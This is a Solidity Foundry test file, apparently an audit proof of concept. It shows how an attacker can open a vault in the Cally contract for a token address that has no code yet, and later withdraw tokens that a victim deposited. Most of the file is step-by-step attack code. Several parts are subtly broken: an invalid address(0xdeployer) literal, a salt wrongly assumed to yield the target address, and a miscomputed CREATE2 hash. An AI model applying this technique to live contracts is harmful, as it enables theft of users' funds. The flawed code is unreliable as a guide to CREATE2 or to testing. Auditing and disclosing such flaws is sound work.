import "forge-std/Test.sol";
import "../../src/Cally.sol";
import "solmate/tokens/ERC20.sol";

contract MockToken is ERC20 {
    constructor(string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol, 18) {
        _mint(msg.sender, initialSupply);
    }
}

contract ExploitTest is Test {
    Cally public cally;
    MockToken public token;
    
    address public attacker = address(0x1);
    address public victim = address(0x2);
    
    // This will be the address where a token might be deployed in the future
    // We calculate it to be the same as what would be deployed with the same nonce
    address public futureTokenAddress;
    
    event NewVault(uint256 indexed vaultId, address indexed from, address indexed token);
    event BoughtOption(uint256 indexed optionId, address indexed from, address indexed token);
    event ExercisedOption(uint256 indexed optionId, address indexed from);
    event Harvested(address indexed from, uint256 amount);
    event InitiatedWithdrawal(uint256 indexed vaultId, address indexed from);
    event Withdrawal(uint256 indexed vaultId, address indexed from);

    function setUp() public {
        // Deploy the Cally contract
        cally = new Cally();
        
        // Calculate a future token address that doesn't have code yet
        // This simulates a token that will be deployed later at a predictable address
        // Using CREATE2 deterministic deployment calculation
        futureTokenAddress = computeCreate2Address(
            bytes32(0), // salt
            keccak256(type(MockToken).creationCode),
            keccak256(abi.encodePacked("Future Token", "FT", 1000000 ether))
        );
        
        // Verify the address has no code initially
        assertEq(futureTokenAddress.code.length, 0, "Future token address should have no code initially");
    }

    function testExploit_PrecomputedTokenAddress() public {
        // Step 1: Attacker creates a vault with a non-existent token address
        // This will succeed because SafeTransferLib doesn't check if the token has code
        vm.startPrank(attacker);
        
        // Attacker "deposits" 10000 tokens of a non-existent token
        // The transfer will silently succeed because there's no code at the address
        uint256 attackerVaultId = cally.createVault(
            10000 ether, // tokenIdOrAmount
            futureTokenAddress, // token address (no code yet)
            0, // premiumIndex
            30, // durationDays
            0, // dutchAuctionStartingStrikeIndex
            1 ether, // dutchAuctionReserveStrike
            Cally.TokenType.ERC20
        );
        
        vm.stopPrank();
        
        // Verify the vault was created despite the token not existing
        assertEq(cally.ownerOf(attackerVaultId), attacker, "Attacker should own the vault");
        
        // Step 2: Time passes and the token is deployed at the predicted address
        // This simulates a project deploying their token on this network
        vm.startPrank(address(0xdeadbeef)); // Different deployer to simulate real scenario
        
        // Deploy the token at the precomputed address
        token = new MockToken{salt: bytes32(0)}("Future Token", "FT", 1000000 ether);
        
        vm.stopPrank();
        
        // Verify the token is now at the expected address
        assertEq(address(token), futureTokenAddress, "Token should be at the expected address");
        assertEq(token.balanceOf(address(0xdeadbeef)), 1000000 ether, "Deployer should have initial supply");
        
        // Step 3: Victim creates a vault with the now-existent token
        vm.startPrank(victim);
        
        // Give victim some tokens
        vm.prank(address(0xdeadbeef));
        token.transfer(victim, 11000 ether);
        
        // Victim deposits 11000 tokens
        uint256 victimVaultId = cally.createVault(
            11000 ether, // tokenIdOrAmount
            address(token), // token address (now has code)
            0, // premiumIndex
            30, // durationDays
            0, // dutchAuctionStartingStrikeIndex
            1 ether, // dutchAuctionReserveStrike
            Cally.TokenType.ERC20
        );
        
        vm.stopPrank();
        
        // Verify victim's vault was created and tokens were transferred
        assertEq(cally.ownerOf(victimVaultId), victim, "Victim should own their vault");
        assertEq(token.balanceOf(address(cally)), 11000 ether, "Cally should have victim's tokens");
        assertEq(token.balanceOf(victim), 0, "Victim should have no tokens left");
        
        // Step 4: Attacker exploits by withdrawing their "deposited" tokens
        vm.startPrank(attacker);
        
        // Attacker initiates withdrawal on their vault
        cally.initiateWithdraw(attackerVaultId);
        
        // Fast forward past the option expiration
        vm.warp(block.timestamp + 31 days);
        
        // Attacker withdraws and receives the tokens
        cally.withdraw(attackerVaultId);
        
        vm.stopPrank();
        
        // Step 5: Verify the exploit succeeded
        // The attacker should have received 10000 tokens that they never actually deposited
        assertEq(token.balanceOf(attacker), 10000 ether, "Attacker should have stolen 10000 tokens");
        
        // The contract should only have 1000 tokens left (11000 - 10000 stolen)
        assertEq(token.balanceOf(address(cally)), 1000 ether, "Contract should have remaining tokens");
        
        // The victim has lost 10000 tokens to the attacker
        assertEq(token.balanceOf(victim), 0, "Victim still has no tokens");
    }

    function testExploit_DirectAddressPrediction() public {
        // Alternative exploit using a simpler address prediction
        // This demonstrates the vulnerability with a more straightforward approach
        
        // Step 1: Attacker chooses an address that might be used for a future token
        // For example, address(0x1234567890123456789012345678901234567890)
        address potentialTokenAddress = address(0x1234567890123456789012345678901234567890);
        
        // Verify it has no code
        assertEq(potentialTokenAddress.code.length, 0, "Potential token address should have no code");
        
        // Step 2: Attacker creates vault with this address
        vm.startPrank(attacker);
        
        uint256 attackerVaultId = cally.createVault(
            5000 ether, // tokenIdOrAmount
            potentialTokenAddress, // token address (no code)
            0, // premiumIndex
            30, // durationDays
            0, // dutchAuctionStartingStrikeIndex
            1 ether, // dutchAuctionReserveStrike
            Cally.TokenType.ERC20
        );
        
        vm.stopPrank();
        
        // Step 3: Someone deploys a token at that address (using CREATE2 with specific salt)
        vm.startPrank(address(0xdeployer));
        
        // Deploy token at the specific address using CREATE2
        bytes32 salt = bytes32(uint256(0x1234567890123456789012345678901234567890));
        token = new MockToken{salt: salt}("Deployed Token", "DT", 500000 ether);
        
        vm.stopPrank();
        
        // Verify token is at the expected address
        assertEq(address(token), potentialTokenAddress, "Token should be at the predicted address");
        
        // Step 4: Give tokens to the contract (simulating victim deposits)
        vm.startPrank(address(0xdeployer));
        token.transfer(address(cally), 5000 ether);
        vm.stopPrank();
        
        // Step 5: Attacker withdraws and steals the tokens
        vm.startPrank(attacker);
        
        cally.initiateWithdraw(attackerVaultId);
        vm.warp(block.timestamp + 31 days);
        cally.withdraw(attackerVaultId);
        
        vm.stopPrank();
        
        // Verify exploit succeeded
        assertEq(token.balanceOf(attacker), 5000 ether, "Attacker should have stolen all tokens");
        assertEq(token.balanceOf(address(cally)), 0, "Contract should have no tokens left");
    }

    // Helper function to compute CREATE2 address
    function computeCreate2Address(
        bytes32 salt,
        bytes32 bytecodeHash,
        bytes32 constructorDataHash
    ) internal pure returns (address) {
        bytes32 data = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                address(this), // deployer
                salt,
                keccak256(
                    abi.encodePacked(
                        bytecodeHash,
                        constructorDataHash
                    )
                )
            )
        );
        return address(uint160(uint256(data)));
    }
}